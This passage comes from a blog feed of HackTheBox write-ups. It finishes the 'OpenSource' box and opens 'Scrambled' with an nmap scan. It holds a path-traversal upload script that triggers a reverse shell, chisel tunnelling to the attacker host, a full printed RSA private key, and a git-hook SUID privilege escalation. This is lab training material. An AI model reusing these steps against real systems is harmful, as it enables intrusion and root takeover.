</span></span><span style="display:flex;"><span>    1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>        inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    20: eth0@if21: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP 
</span></span><span style="display:flex;"><span>        link/ether 02:42:ac:11:00:05 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>        inet 172.17.0.5/16 brd 172.17.255.255 scope global eth0
</span></span><span style="display:flex;"><span>        valid_lft forever preferred_lft forever
</span></span></code></pre></div><ul>
<li>
<p>You might get some weird characters at the begining of the prompt like <em>/app # ^[[24;8R</em> which is ok, you can avoid this by getting a fully interactive shell, via backgrounding the shell using <em>CTRL+z</em> then issuing the command <em>stty raw -echo;fg</em> and pressing enter.</p>
</li>
<li>
<p>This is a simple python3 script I wrote to upload the file automatically and get a reverse shell, I just need to listen on my specified port before executing it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat upload_malicious<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sleep
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Provide your listening IP followed by the Port as argument&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;malicious-views.py&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    malView <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>malFile <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;file&#34;</span>: (<span style="color:#e6db74">&#34;..//app/app/views.py&#34;</span>, malView)}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://opensource.htb/upcloud&#34;</span>, files<span style="color:#f92672">=</span>malFile)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(res)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://opensource.htb/revShell/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(ip, port))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(res)
</span></span></code></pre></div></li>
</ul>
<h2 id="discovering-the-application-on-port-3000">Discovering the Application on port 3000</h2>
<p>It looks like we are root inside a docker container. I can also see a request comming from the main host to this machine every few minutes <em>172.17.0.1 - - [05/Oct/2022 15:02:02] &ldquo;GET / HTTP/1.1&rdquo; 200 -</em>.</p>
<p>The first thing I&rsquo;ll do is to check the port <em>3000</em> that was previously marked as <em>filtered</em> by nmap to see if I can get anything.</p>
<p>Using <em>netcat</em>, I&rsquo;ll check to see if this is a webserver (usually webservers runs on port 3000).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># nc 172.17.0.1 3000</span>
</span></span><span style="display:flex;"><span>HEAD / HTTP/1.1
</span></span><span style="display:flex;"><span>Host: 172.17.0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Set-Cookie: i_like_gitea<span style="color:#f92672">=</span>a0f2435183e3d93a; Path<span style="color:#f92672">=</span>/; HttpOnly; SameSite<span style="color:#f92672">=</span>Lax
</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#ae81ff">05</span> Oct <span style="color:#ae81ff">2022</span> 15:11:22 GMT
</span></span></code></pre></div><p>And I got a response, and by reading the session cookie I can tell that this application is <a href="https://gitea.io/en-us/"><em>Gitea</em></a>.</p>
<h3 id="getting-user-on-the-host-machine">Getting User On the Host Machine</h3>
<p>I&rsquo;ll upload <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> to the victim machine and <em>port forward</em> the port <em>3000</em> to my local attacking machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -m http.server
</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</span></span><span style="display:flex;"><span>10.10.11.164 - - <span style="color:#f92672">[</span>06/Oct/2022 06:31:47<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /chisel_1.7.7_linux_amd64 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># wget http://10.10.16.59:8000/chisel_1.7.7_linux_amd64</span>
</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000 <span style="color:#f92672">(</span>10.10.16.59:8000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>saving to <span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span>
</span></span><span style="display:flex;"><span>chisel_1.7.7_linux_a 100% |********************************| 7888k  0:00:00 ETA
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;chisel_1.7.7_linux_amd64&#39;</span> saved
</span></span></code></pre></div><p>On my attacking machine, I&rsquo;ll run a server instance of <a href="https://github.com/jpillora/chisel/releases"><em>chisel</em></a> that will listen on port 9001, then I&rsquo;ll connect to it from the victim machine and forward the connection of <em>http://172.17.0.1:3000/</em> accessible only from this machine to mine.</p>
<ul>
<li>On the attacker:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Reverse tunnelling enabled
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Fingerprint kLnVUdsvKZMD+fJ8bH+jt0Hizup2oUVE54EiS6kzxzs<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>2022/10/06 06:44:50 server: Listening on http://0.0.0.0:9001
</span></span></code></pre></div></li>
<li>On the victim:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>/app <span style="color:#75715e"># ./chisel_1.7.7_linux_amd64 client 10.10.16.59:9001 R:127.0.0.1:3000:172.17.0.1:3000</span>
</span></span><span style="display:flex;"><span>2022/10/06 03:51:01 client: Connecting to ws://10.10.16.59:9001
</span></span><span style="display:flex;"><span>2022/10/06 03:51:02 client: Connected <span style="color:#f92672">(</span>Latency 81.014967ms<span style="color:#f92672">)</span>
</span></span></code></pre></div></li>
</ul>
<p>I can now access <a href="https://gitea.io/en-us/"><em>Gitea</em></a> from my attacking machine using firefox on <em>http://127.0.0.1:3000/</em></p>
<p><img src="accessing-gitea.png" alt="Accessing Gitea From My Machine"></p>
<p>Now I&rsquo;ll use the previous credentials <em>dev01:Soulless_Developer#2022</em> to try to login to this instance.</p>
<p><img src="discovering-home-dir-backup.png" alt="Loging In To Gitea"></p>
<p>It appears that this user is trying to backup his home directory, so we can take advantage of this and read his <em>.ssh/id_rsa</em> key file.</p>
<p><img src="reading-ssh-key.png" alt="Reading SSH Key"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> dev01_id_rsa 
</span></span><span style="display:flex;"><span>$ cat dev01_id_rsa 
</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
</span></span><span style="display:flex;"><span>MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0l
</span></span><span style="display:flex;"><span>xfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6R
</span></span><span style="display:flex;"><span>u2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BL
</span></span><span style="display:flex;"><span>7FU4L6ihII7zNEjaM1/d7xJ/0M88NhS1X4szT6txiB6oBMQGGolDlDJXqA0BN6cF
</span></span><span style="display:flex;"><span>wEza2LLTiogLkCpST2orKIMGZvr4VS/xw6v5CDlyNaMGpvlo+88ZdvNiKLnkYrkE
</span></span><span style="display:flex;"><span>WM+N+2c1V1fbWxBp2ImEhAvvgANx6AsNZxZFuupHW953npuL47RSn5RTsFXOaKiU
</span></span><span style="display:flex;"><span>rzJZvoIc7h/9Jh0Er8QLcWvMRV+5hjQLZXTcey2dn7S0OQnO2n3vb5FWtJeWVVaN
</span></span><span style="display:flex;"><span>O/cZWqNApc2n65HSdX+JY+wznGU6oh9iUpcXplRWNH321s9WKVII2Ne2xHEmE/ok
</span></span><span style="display:flex;"><span>Nk+ZgGMFvD09RIB62t5YWF+yitMDx2E+XSg7bob3EO61zOlvjtY2cgvO6kmn1E5a
</span></span><span style="display:flex;"><span>FX5S6sjxxncq4cj1NpWQRjxzu63SlP5i+3N3QPAH2UsVTVcbsWqr9jbl/5h4enkN
</span></span><span style="display:flex;"><span>W0xav8MWtbCnAsmhuBzsLML0+ootNpbagxSmIiPPV1p/oHLRsRnJ4jaqoBECAwEA
</span></span><span style="display:flex;"><span>AQKCAgEAkXmFz7tGc73m1hk6AM4rvv7C4Sv1P3+emHqsf5Y4Q63eIbXOtllsE/gO
</span></span><span style="display:flex;"><span>WFQRRNoXvasDXbiOQqhevMxDyKlqRLElGJC8pYEDYeOeLJlhS84Fpp7amf8zKEqI
</span></span><span style="display:flex;"><span>naMZHbuOg89nDbtBtbsisAHcs+ljBTw4kJLtFZhJ0PRjbtIbLnvHJMJnSH95Mtrz
</span></span><span style="display:flex;"><span>rkDIePIwe/KU3kqq1Oe0XWBAQSmvO4FUMZiRuAN2dyVAj6TRE1aQxGyBsMwmb55D
</span></span><span style="display:flex;"><span>O1pxDYA0I3SApKQax/4Y4GHCbC7XmQQdo3WWLVVdattwpUa7wMf/r9NwteSZbdZt
</span></span><span style="display:flex;"><span>C/ZoJQtaofatX7IZ60EIRBGz2axq7t+IEDwSAQp3MyvNVK4h83GifVb/C9+G3XbM
</span></span><span style="display:flex;"><span>BmUKlFq/g20D225vnORXXsPVdKzbijSkvupLZpsHyygFIj8mdg2Lj4UZFDtqvNSr
</span></span><span style="display:flex;"><span>ajlFENjzJ2mXKvRXvpcJ6jDKK+ne8AwvbLHGgB0lZ8WrkpvKU6C/ird2jEUzUYX7
</span></span><span style="display:flex;"><span>rw/JH7EjyjUF/bBlw1pkJxB1HkmzzhgmwIAMvnX16FGfl7b3maZcvwrfahbK++Dd
</span></span><span style="display:flex;"><span>bD64rF+ct0knQQw6eeXwDbKSRuBPa5YHPHfLiaRknU2g++mhukE4fqcdisb2OY6s
</span></span><span style="display:flex;"><span>futu9PMHBpyHWOzO4rJ3qX5mpexlbUgqeQHvsrAJRISAXi0md0ECggEBAOG4pqAP
</span></span><span style="display:flex;"><span>IbL0RgydFHwzj1aJ/+L3Von1jKipr6Qlj/umynfUSIymHhhikac7awCqbibOkT4h
</span></span><span style="display:flex;"><span>XJkJGiwjAe4AI6/LUOLLUICZ+B6vo+UHP4ZrNjEK3BgP0JC4DJ5X/S2JUfxSyOK+
</span></span><span style="display:flex;"><span>Hh/CwZ9/6/8PtLhe7J+s7RYuketMQDl3MOp+MUdf+CyizXgYxdDqBOo67t4DxNqs
</span></span><span style="display:flex;"><span>ttnakRXotUkFAnWWpCKD+RjkBkROEssQlzrMquA2XmBAlvis+yHfXaFj3j0coKAa
</span></span><span style="display:flex;"><span>Ent6NIs/B8a/VRMiYK5dCgIDVI9p+Q7EmBL3HPJ+29A6Eg3OG50FwfPfcvxtxjYw
</span></span><span style="display:flex;"><span>Fq338ppt+Co0wd8CggEBAMCXiWD6jrnKVJz7gVbDip64aa1WRlo+auk8+mlhSHtN
</span></span><span style="display:flex;"><span>j+IISKtyRF6qeZHBDoGLm5SQzzcg5p/7WFvwISlRN3GrzlD92LFgj2NVjdDGRVUk
</span></span><span style="display:flex;"><span>kIVKRh3P9Q4tzewxFoGnmYcSaJwVHFN7KVfWEvfkM1iucUxOj1qKkD1yLyP7jhqa
</span></span><span style="display:flex;"><span>jxEYrr4+j1HWWmb7Mvep3X+1ZES1jyd9zJ4yji9+wkQGOGFkfzjoRyws3vPLmEmv
</span></span><span style="display:flex;"><span>VeniuSclLlX3xL9CWfXeOEl8UWd2FHvZN8YeK06s4tQwPM/iy0BE4sDQyae7BO6R
</span></span><span style="display:flex;"><span>idvvvD8UInqlc+F2n1X7UFKuYizOiDz0D2pAsJI9PA8CggEBAI/jNoyXuMKsBq9p
</span></span><span style="display:flex;"><span>vrJB5+ChjbXwN4EwP18Q9D8uFq+zriNe9nR6PHsM8o5pSReejSM90MaLW8zOSZnT
</span></span><span style="display:flex;"><span>IxrFifo5IDHCq2mfPNTK4C5SRYN5eo0ewBiylCB8wsZ5jpHllJbFavtneCqE6wqy
</span></span><span style="display:flex;"><span>8AyixXA2Sp6rDGN0gl49OD+ppEwG74DxQ3GowlQJbqhzVXi+4qAyRN2k9dbABnax
</span></span><span style="display:flex;"><span>5kZK5DtzMOQzvqnISdpm7oH17IF2EINnBRhUdCjHlDsOeVA1KmlIg3grxpZh23bc
</span></span><span style="display:flex;"><span>Uie2thPBeWINOyD3YIMfab2pQsvsLM7EYXlGW1XjiiS5k97TFSinDZBjbUGu6j7Z
</span></span><span style="display:flex;"><span>VTYKdX8CggEAUsAJsBiYQK314ymRbjVAl2gHSAoc2mOdTi/8LFE3cntmCimjB79m
</span></span><span style="display:flex;"><span>LwKyj3TTBch1hcUes8I4NZ8qXP51USprVzUJxfT8KWKi2XyGHaFDYwz957d9Hwwe
</span></span><span style="display:flex;"><span>cAQwSX7h+72GkunO9tl/PUNbBTmfFtH/WehCGBZdM/r7dNtd8+j/KuEj/aWMV4PL
</span></span><span style="display:flex;"><span>0s72Mu9V++IJoPjQZ1FXfBFqXMK+Ixwk3lOJ4BbtLwdmpU12Umw1N9vVX1QiV/Z6
</span></span><span style="display:flex;"><span>zUdTSxZ4TtM3fiOjWn/61ygC9eY6l2hjYeaECpKY4Dl48H4FV0NdICB6inycdsHw
</span></span><span style="display:flex;"><span>+p+ihcqRNcFwxsXUuwnWsdHv2aiH9Z3H8wKCAQAlbliq7YW45VyYjg5LENGmJ8f0
</span></span><span style="display:flex;"><span>gEUu7u8Im+rY+yfW6LqItUgCs1zIaKvXkRhOd7suREmKX1/HH3GztAbmYsURwIf/
</span></span><span style="display:flex;"><span>nf4P67EmSRl46EK6ynZ8oHW5bIUVoiVV9SPOZv+hxwZ5LQNK3o7tuRyA6EYgEQll
</span></span><span style="display:flex;"><span>o5tZ7zb7XTokw+6uF+mQriJqJYjhfJ2oXLjpufS+id3uYsLKnAXX06y4lWqaz72M
</span></span><span style="display:flex;"><span>NfYDE7uwRhS1PwQyrMbaurAoI1Dq5n5nl6opIVdc7VlFPfoSjzixpWiVLZFoEbFB
</span></span><span style="display:flex;"><span>AE77E1AeujKjRkXLQUO3z0E9fnrOl5dXeh2aJp1f+1Wq2Klti3LTLFkKY4og
</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><p>Using SSH I can login the machine and get the user flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ssh -i dev01_id_rsa dev01@opensource.htb
</span></span><span style="display:flex;"><span>Welcome to Ubuntu 18.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-176-generic x86_64<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System information as of Thu Oct  <span style="color:#ae81ff">6</span> 05:38:28 UTC <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  System load:  0.01              Processes:              <span style="color:#ae81ff">215</span>
</span></span><span style="display:flex;"><span>  Usage of /:   75.6% of 3.48GB   Users logged in:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Memory usage: 22%               IP address <span style="color:#66d9ef">for</span> eth0:    10.10.11.164
</span></span><span style="display:flex;"><span>  Swap usage:   0%                IP address <span style="color:#66d9ef">for</span> docker0: 172.17.0.1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">16</span> updates can be applied immediately.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">9</span> of these updates are standard security updates.
</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#ae81ff">16</span> 13:13:33 <span style="color:#ae81ff">2022</span> from 10.10.14.23
</span></span><span style="display:flex;"><span>dev01@opensource:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>dev01@opensource:~$ cat user.txt 
</span></span><span style="display:flex;"><span>6c4**************************c7c
</span></span><span style="display:flex;"><span>dev01@opensource:~$ 
</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
<p>I&rsquo;ll use <a href="https://github.com/DominicBreuker/pspy#download"><em>pspy</em></a> to snoop on running processes and see if I can get anything about root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ wget http://10.10.16.59:8000/pspy64 
</span></span><span style="display:flex;"><span>--2022-10-06 07:52:21--  http://10.10.16.59:8000/pspy64
</span></span><span style="display:flex;"><span>Connecting to 10.10.16.59:8000... connected.
</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">3078592</span> <span style="color:#f92672">(</span>2.9M<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>application/octet-stream<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pspy64                                               100%<span style="color:#f92672">[======================================================================================================================</span>&gt;<span style="color:#f92672">]</span>   2.94M   117KB/s    in 39s     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2022-10-06 07:53:02 <span style="color:#f92672">(</span>76.5 KB/s<span style="color:#f92672">)</span> - ‘pspy64’ saved <span style="color:#f92672">[</span>3078592/3078592<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ chmod +x pspy64
</span></span><span style="display:flex;"><span>dev01@opensource:/tmp$ ./pspy64
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16029</span>  | /bin/bash /usr/local/bin/git-sync 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16030</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16031</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16034</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16033</span>  | /bin/bash /root/meta/app/clean.sh 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16032</span>  | /bin/bash /usr/local/bin/git-sync 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16035</span>  | git add . 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16037</span>  | git push origin main 
</span></span><span style="display:flex;"><span>2022/10/06 07:56:01 CMD: UID<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>    PID<span style="color:#f92672">=</span><span style="color:#ae81ff">16038</span>  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>It appears that root is executing <em>/usr/local/bin/git-sync</em> which is a script that contains <em>git</em> commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:/tmp$ cat /usr/local/bin/git-sync
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cd /home/dev01/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ! git status --porcelain; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;No changes&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    day<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>date +<span style="color:#e6db74">&#39;%Y-%m-%d&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;Changes detected, pushing..&#34;</span>
</span></span><span style="display:flex;"><span>    git add .
</span></span><span style="display:flex;"><span>    git commit -m <span style="color:#e6db74">&#34;Backup for </span><span style="color:#e6db74">${</span>day<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    git push origin main
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><h3 id="getting-root">Getting root</h3>
<p>The overall idea about escalating privileges is about root <em>commiting changes</em> by navigating to the <em>/home/dev01</em> directory and then commiting these changes. So I can <em>add a hook</em> in the <em>.git/hooks/</em> directory which is a script that will get executed by any user running a specific git command.</p>
<p>There are many types of hooks, for example a <em>pre-commit</em> hook will run before the user commits a change, on the other hand, a <em>post-commit</em> hook will run after the commit takes place, and there are others depending on the actions taken like push &hellip;</p>
<p>So, I&rsquo;ll add a new file in <em>.git/hooks/</em> called <em>pre-commit</em> that contains a reverse shell and make it executable and this will run whenever any user makes a commit in this repo/directory, and since root is making commits when any change is made to the directory, I&rsquo;ll also create a new file.</p>
<p>To get root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>touch ~/dummyfile
</span></span><span style="display:flex;"><span>touch ~/.git/hooks/pre-commit;
</span></span><span style="display:flex;"><span>chmod +x ~/.git/hooks/pre-commit;
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#39;#!/bin/bash\ncp /bin/bash /tmp/newbash;\nchmod u+s /tmp/newbash&#39;</span> &gt; ~/.git/hooks/pre-commit
</span></span></code></pre></div><p>After waiting some time, a new <em>SUID</em> bash file has been created in <em>/tmp</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dev01@opensource:~$ ls -l /tmp/newbash 
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1113504</span> Oct  <span style="color:#ae81ff">6</span> 09:30 /tmp/newbash
</span></span><span style="display:flex;"><span>dev01@opensource:~$ /tmp/newbash -p
</span></span><span style="display:flex;"><span>newbash-4.4# id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dev01<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>newbash-4.4# cat /root/root.txt
</span></span><span style="display:flex;"><span>288**************************093
</span></span></code></pre></div>]]></content>
        </item>
        
        <item>
            <title>Scrambled</title>
            <link>https://mostxeon.github.io/posts/scrambled/</link>
            <pubDate>Tue, 27 Sep 2022 22:16:35 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/scrambled/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a full tcp port scan we got the below results</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.168
</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.084s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Scanned at 2022-09-20 03:50:10 EEST <span style="color:#66d9ef">for</span> 512s
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65513</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
